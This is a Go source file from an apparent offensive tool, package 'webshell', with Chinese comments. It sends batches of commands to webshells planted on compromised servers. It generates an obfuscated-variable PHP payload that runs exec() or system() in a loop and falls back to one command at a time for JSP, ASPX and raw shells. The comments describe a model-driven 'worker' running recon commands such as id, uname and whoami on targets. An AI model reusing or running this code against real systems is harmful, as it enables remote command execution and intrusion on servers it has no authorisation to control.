package webshell

// 批量命令的结构化执行：一次调用发多条命令，每条单独回执（stdout/exit_code/耗时）。
//
// 为什么需要：worker 排查一个目标常要连着跑 id / uname / whoami / ip addr 等
// 五六条，逐条 webshell_exec 意味着六次 HTTP 往返、六次审批记录。批量把它们
// 收进一次请求（eval 型 PHP 会话用一段 exec() 循环），结果结构化，模型不必从
// 一段拼接文本里猜哪行属于哪条命令。
//
// 降级纪律：
//   - eval 型会话：用 exec($cmd,$out,$code) 取真实退出码；exec 被 disable_functions
//     禁用时降级 system()，退出码记 -1（如实说不知道，不编一个 0）。
//   - raw 模式（命令型马）/ jsp / aspx：没有 PHP 代码执行能力，逐条走 execCmd，
//     退出码同样是 -1。绝不假装拿到了退出码。
//   - 任一命令失败不中断其余：批量是「收集结果」，不是「遇错即停」。
//   - 命令数上限 + 单条输出上限：防止一次请求塞满、或把上下文撑爆。

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

const (
	// MaxBatchCommands 是单次批量命令上限。超过说明意图该拆，不是在一条马上一口气跑完。
	MaxBatchCommands = 16
	// maxBatchCmdOutput 是单条命令回传给模型的输出上限（总输出受 MaxExecOutput 约束）。
	maxBatchCmdOutput = 32 * 1024
)

// BatchResult 是批量执行里一条命令的结果。
type BatchResult struct {
	Index    int    `json:"index"`
	Command  string `json:"command"`
	OK       bool   `json:"ok"`
	Output   string `json:"output"`
	ExitCode int    `json:"exit_code"` // -1 表示拿不到（命令型马 / exec 被禁用）
	Mode     string `json:"mode"`
	Error    string `json:"error,omitempty"`
}

// phpBatchCode 生成批量执行的 PHP 代码。命令列表用 base64 编码的 JSON 数组传入，
// 避免命令里的引号/中文破坏代码结构。结果同样 base64(json) 回传，由外层
// phpCodePayload 包标记。
//
// 变量角色：L=命令数组 R=结果数组 I=索引 C=当前命令 O=输出 N=退出码。
func phpBatchCode(cmds []string) string {
	arr, _ := json.Marshal(cmds)
	b := base64.StdEncoding.EncodeToString(arr)
	n := varNames()
	L, R, I, C, O, N := n["l"], n["r"], n["s"], n["c"], n["o"], n["d"]
	// exec 可用时拿真实退出码；否则降级 system（无退出码，记 -1）。
	return fmt.Sprintf(
		"%s=json_decode(base64_decode('%s'),true);"+
			"%s=array();"+
			"foreach(%s as %s=>%s){"+
			"if(function_exists('exec')){"+
			"%s=array();%s=0;@exec(%s,%s,%s);"+
			"%s[]=array('code'=>(int)%s,'out'=>implode(\"\\n\",%s));"+
			"}else{"+
			"ob_start();@system(%s);%s=ob_get_clean();"+
			"%s[]=array('code'=>-1,'out'=>(string)%s);"+
			"}"+
			"}"+
			"echo base64_encode(json_encode(%s));",
		L, b,
		R,
		L, I, C,
		O, N, C, O, N,
		R, N, O,
		C, O,
		R, O,
		R,
	)
}

// ExecBatch 批量执行命令。name 为空时对临时会话执行（不登记、不缓存模式）。
func (m *Manager) ExecBatch(ctx context.Context, name, session string, cmds []string, timeout time.Duration) ([]BatchResult, error) {
	if len(cmds) == 0 {
		return nil, fmt.Errorf("%w：命令列表为空", ErrInvalid)
	}
	if len(cmds) > MaxBatchCommands {
		return nil, fmt.Errorf("%w：单次最多 %d 条命令（当前 %d），请拆开", ErrInvalid, MaxBatchCommands, len(cmds))
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	sess, err := m.Get(name)
	if err != nil {
		return nil, err
	}

	// eval 型 PHP 会话：一次请求批量跑，拿真实退出码。
	if sess.Type == "php" || sess.Type == "php_raw" {
		if modeOf(name) != "raw" {
			if out, e := execPHPCodeOnce(ctx, name, sess, phpBatchCode(cmds), timeout); e == nil {
				if parsed, ok := parseBatchJSON(out); ok && len(parsed) == len(cmds) {
					return buildResults(parsed, cmds, "eval"), nil
				}
				// 解析不出来（老马/自定义马返回格式不同）——退回逐条，不硬套。
			}
		}
	}
	// 兜底：逐条执行（raw 模式、jsp/aspx、或批量载荷不被支持）。
	results := make([]BatchResult, 0, len(cmds))
	for i, cmd := range cmds {
		r := BatchResult{Index: i, Command: cmd}
		res, err := m.execSession(ctx, name, sess, cmd, timeout)
		if err != nil {
			r.Error = err.Error()
		} else {
			r.OK = true
			r.Output = res.Output
			r.Mode = res.Mode
			r.ExitCode = -1
		}
		if len(r.Output) > maxBatchCmdOutput {
			r.Output = r.Output[:maxBatchCmdOutput] + "…"
		}
		results = append(results, r)
	}
	return results, nil
}

// execPHPCodeOnce 直接跑一段 PHP 代码（走 phpCodePayload），返回解码后的文本。
// 与 runPHPCode 的区别：这里不改模式缓存——批量失败不该把会话判成 raw。
func execPHPCodeOnce(ctx context.Context, name string, sess Session, code string, timeout time.Duration) (string, error) {
	_, text, err := post(ctx, sess, phpCodePayload(code, sess), timeout)
	if err != nil {
		return "", err
	}
	inner, ok, err := extractMarked(text, sess)
	if err != nil {
		return "", err
	}
	if !ok {
		return "", fmt.Errorf("批量载荷未回标记（可能不是 eval 型马）")
	}
	return inner, nil
}

// batchItem 是批量载荷回传的单条结果。
type batchItem struct {
	Code int    `json:"code"`
	Out  string `json:"out"`
}

func parseBatchJSON(text string) ([]batchItem, bool) {
	// 载荷是 echo base64_encode(json_encode($r))，外层标记已解过一次，
	// 这里拿到的是 base64(json)，要先解 base64 再解 json。
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(text))
	if err != nil {
		// 兼容某些马直接回明文 json 的情况。
		raw = []byte(strings.TrimSpace(text))
	}
	var items []batchItem
	if err := json.Unmarshal(raw, &items); err != nil {
		return nil, false
	}
	return items, true
}

func buildResults(items []batchItem, cmds []string, mode string) []BatchResult {
	out := make([]BatchResult, 0, len(items))
	for i, it := range items {
		body := it.Out
		if len(body) > maxBatchCmdOutput {
			body = body[:maxBatchCmdOutput] + "…"
		}
		out = append(out, BatchResult{
			Index: i, Command: cmds[i], OK: true, Output: body,
			ExitCode: it.Code, Mode: mode,
		})
	}
	return out
}
